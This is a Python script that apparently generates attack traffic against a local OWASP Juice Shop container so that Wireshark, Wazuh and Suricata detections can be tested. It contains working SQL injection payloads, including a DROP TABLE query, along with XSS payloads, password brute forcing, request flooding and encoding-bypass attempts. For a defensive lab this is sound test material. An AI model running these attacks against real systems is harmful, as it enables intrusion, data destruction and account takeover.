#!/usr/bin/env python3
"""
Docker-based Web Application Attack Script
Runs attacks from within the Docker network to ensure proper packet capture
"""

import requests
import time
import sys
import json
from datetime import datetime

# Configure requests to not verify SSL (for self-signed certs)
requests.packages.urllib3.disable_warnings()

target = 'http://juice-shop:3000'
session = requests.Session()
session.verify = False

def log_attack(attack_type, payload, status):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{attack_type}] Payload: {payload[:50]}... | Status: {status}")

print("\n" + "="*80)
print("WEB APPLICATION ATTACK SCENARIO (Docker Network)")
print("="*80 + "\n")

# ============================================================================
# SQL INJECTION ATTACKS
# ============================================================================
print("[*] PHASE 1: SQL INJECTION ATTACKS")
print("-" * 80)

sql_payloads = [
    ("Union-based", "' UNION SELECT NULL,NULL,NULL--"),
    ("Boolean-based", "' OR '1'='1"),
    ("Time-based", "' AND SLEEP(5)--"),
    ("Comment-based", "admin' --"),
    ("Stacked queries", "'; DROP TABLE users;--"),
]

for payload_name, payload in sql_payloads:
    try:
        print(f"\n[+] Testing {payload_name} SQL injection...")
        
        # Try multiple endpoints
        endpoints = [
            '/rest/user/login',
            '/api/Products',
            '/api/Users',
        ]
        
        for endpoint in endpoints:
            try:
                response = session.get(
                    f"{target}{endpoint}",
                    params={'email': payload, 'password': 'test'},
                    timeout=3
                )
                log_attack("SQL_INJECTION", f"{payload_name} @ {endpoint}", response.status_code)
            except Exception as e:
                pass
                
    except Exception as e:
        print(f"[-] Error: {str(e)[:50]}")
    
    time.sleep(0.3)

# ============================================================================
# XSS (CROSS-SITE SCRIPTING) ATTACKS
# ============================================================================
print("\n\n[*] PHASE 2: XSS ATTACKS")
print("-" * 80)

xss_payloads = [
    ("Basic Script", "<script>alert('XSS')</script>"),
    ("Event Handler", "<img src=x onerror='alert(1)'>"),
    ("SVG Vector", "<svg onload=alert('XSS')>"),
    ("HTML Attribute", "javascript:alert(1)"),
    ("Data Protocol", "data:text/html,<script>alert('XSS')</script>"),
]

for payload_name, payload in xss_payloads:
    try:
        print(f"\n[+] Testing {payload_name} XSS...")
        
        # Try multiple endpoints
        endpoints = [
            '/search',
            '/api/search',
            '/products',
        ]
        
        for endpoint in endpoints:
            try:
                response = session.get(
                    f"{target}{endpoint}",
                    params={'q': payload},
                    timeout=3
                )
                log_attack("XSS", f"{payload_name} @ {endpoint}", response.status_code)
            except Exception as e:
                pass
                
    except Exception as e:
        print(f"[-] Error: {str(e)[:50]}")
    
    time.sleep(0.3)

# ============================================================================
# BRUTE FORCE ATTACKS
# ============================================================================
print("\n\n[*] PHASE 3: BRUTE FORCE LOGIN ATTACKS")
print("-" * 80)

common_passwords = [
    'password',
    '123456',
    'admin',
    'letmein',
    'welcome',
    '12345678',
    'qwerty',
    'monkey',
    '1234567',
    'dragon',
]

common_users = [
    'admin@juice-shop.local',
    'admin@example.com',
    'test@example.com',
    'user@juice-shop.local',
]

attempt_count = 0
for user in common_users:
    for pwd in common_passwords[:3]:  # Limit attempts to avoid lockout
        try:
            attempt_count += 1
            print(f"\n[+] Brute Force Attempt {attempt_count}: {user}:{pwd}")
            
            response = session.post(
                f"{target}/api/login",
                json={'email': user, 'password': pwd},
                timeout=3
            )
            log_attack("BRUTE_FORCE", f"{user}:{pwd}", response.status_code)
            
            if response.status_code == 200:
                print(f"    [!] POSSIBLE MATCH: {user}:{pwd}")
                
        except Exception as e:
            pass
        
        time.sleep(0.3)

# ============================================================================
# ANOMALOUS REQUESTS
# ============================================================================
print("\n\n[*] PHASE 4: ANOMALOUS REQUEST PATTERNS")
print("-" * 80)

# Rapid requests (potential DDoS)
print("\n[+] Sending rapid requests (50 requests in 5 seconds)...")
for i in range(50):
    try:
        session.get(f"{target}/api/Products", timeout=1)
        if i % 10 == 0:
            print(f"    Sent {i+1} requests...")
    except:
        pass

# Large payload
print("\n[+] Sending large payload...")
large_payload = "A" * 10000
try:
    session.get(f"{target}/search", params={'q': large_payload}, timeout=3)
    log_attack("LARGE_PAYLOAD", "10KB payload", "sent")
except:
    pass

# Null bytes and encoding tricks
print("\n[+] Testing encoding bypass attempts...")
encoding_payloads = [
    ("Null byte", "%00admin"),
    ("Double encoding", "%252527%20OR%20%25273%253d3"),
    ("Unicode", "\\u0061dmin"),
]

for name, payload in encoding_payloads:
    try:
        session.get(f"{target}/api/Users", params={'id': payload}, timeout=3)
        log_attack("ENCODING_BYPASS", name, "sent")
    except:
        pass

print("\n" + "="*80)
print("ALL ATTACK PHASES COMPLETED")
print("="*80)
print("\n[!] Check Wireshark for captured packets")
print("[!] Monitor Wazuh Dashboard for alerts")
print("[!] Review Suricata logs for IDS/IPS detections\n")
